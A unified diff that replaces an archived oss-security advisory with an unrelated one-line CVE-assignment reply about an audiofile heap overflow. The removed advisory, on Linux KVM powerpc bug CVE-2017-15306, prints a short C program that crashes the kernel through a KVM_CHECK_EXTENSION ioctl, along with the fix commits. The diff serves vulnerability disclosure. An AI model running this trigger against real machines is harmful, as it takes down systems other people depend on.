@@ -1,53 +1,19 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/06/6
-Message-ID: <87efpbbt6v.fsf@concordia.ellerman.id.au>
-Date: Mon, 06 Nov 2017 21:24:56 +1100
-From: Michael Ellerman <mpe@...erman.id.au>
-To: oss-security@...ts.openwall.com <oss-security@...ts.openwall.com>
-Cc: groug@...d.org, sam.bobroff@....ibm.com
-Subject: CVE-2017-15306: Linux kernel: KVM: PPC: Fix oops when checking KVM_CAP_PPC_HTM
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/13/6
+Message-ID: <1605678.LEK1Z9kDq5@blackgate>
+Date: Mon, 13 Mar 2017 10:38:01 +0100
+From: Agostino Sarubbo <ago@...too.org>
+To: oss-security@...ts.openwall.com
+Subject: Re: audiofile: heap-based buffer overflow in ulaw2linear_buf (G711.cpp)
 Content-Type: text/plain; charset=utf-8
 
-Hi folks,
+On Sunday 26 February 2017 11:54:14 Agostino Sarubbo wrote:
+> Permalink:
+> https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow
+> -in-ulaw2linear_buf-g711-cpp
 
-Greg Kurz discovered a local denial of service (kernel oops) in the KVM
-code for powerpc.
+This is CVE-2017-6834
 
-From his report:
-
-    The following program causes a kernel oops:
-    
-    #include <sys/types.h>
-    #include <sys/stat.h>
-    #include <fcntl.h>
-    #include <sys/ioctl.h>
-    #include <linux/kvm.h>
-    
-    main()
-    {
-        int fd = open("/dev/kvm", O_RDWR);
-        ioctl(fd, KVM_CHECK_EXTENSION, KVM_CAP_PPC_HTM);
-    }
-    
-    This happens because when using the global KVM fd with
-    KVM_CHECK_EXTENSION, kvm_vm_ioctl_check_extension() gets
-    called with a NULL kvm argument, which gets dereferenced
-    in is_kvmppc_hv_enabled().
-
-
-The bug was introduced in commit:
-
-  23528bb21ee2 ("KVM: PPC: Introduce KVM_CAP_PPC_HTM")
-
-Which was merged into kernel 4.8-rc1.
-
-The fix is now in mainline:
-
-  ac64115a66c1 ("KVM: PPC: Fix oops when checking KVM_CAP_PPC_HTM")
-
-  https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ac64115a66c1
-
-
-cheers
-
-Download attachment "signature.asc" of type "application/pgp-signature" (819 bytes)
+-- 
+Agostino Sarubbo
+Gentoo Linux Developer
